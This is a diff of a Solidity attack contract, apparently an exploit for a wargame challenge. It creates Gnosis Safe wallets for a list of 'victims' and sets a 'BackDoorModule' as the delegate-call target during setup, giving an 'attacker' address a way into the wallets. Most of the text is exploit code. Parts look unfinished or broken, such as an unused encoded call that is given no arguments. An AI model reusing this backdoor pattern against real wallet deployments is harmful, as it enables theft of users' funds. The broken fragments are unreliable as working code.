@@ -20,28 +20,32 @@ contract WalletCreator {
 
     WalletRegistry immutable walletRegistry;
 
-    BackDoorModule immutable backdoormodule;
+    BackDoorModule private _backdoormodule;
 
     address[] private _victims;
+
+    address immutable attacker;
 
     uint256 private constant MAX_THRESHOLD = 1;
 
     constructor(
         address gnosisSafeMasterCopy_,
         address gnosisSafeProxyFactory_,
+        address backdoormodule_,
         WalletRegistry walletRegistry_,
         address[] memory victims_,
         address fallbackHandler_,
         address paymentToken_,
-        address payable backdoormodule_
+        address attacker_
     ) {
         gnosisSafeMasterCopy = gnosisSafeMasterCopy_;
         gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
+        _backdoormodule = backdoormodule_;
         walletRegistry = walletRegistry_;
         _victims = victims_;
         fallbackHandler = fallbackHandler_;
         paymentToken = paymentToken_;
-        backdoormodule = BackDoorModule(backdoormodule_);
+        attacker = attacker_;
     }
 
     // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
@@ -49,13 +53,16 @@ contract WalletCreator {
     // (respecting threshold and owners of the Safe).
     function createGnosisSafeWallet() public {
         uint256 counter = 0;
+        bytes memory data = abi.encodeWithSignature(
+            "setupWallet(address,address,address)"
+        );
         for (counter; counter < _victims.length; counter++) {
             //  await safe.setup([user1.address, user2.address], 1, AddressZero, "0x", handler.address, AddressZero, 0, AddressZero)
             bytes memory initializer = abi.encodeWithSignature(
                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                 _victims[counter],
                 MAX_THRESHOLD,
-                address(0),
+                address(_backdoormodule),
                 0x0,
                 fallbackHandler,
                 address(0),
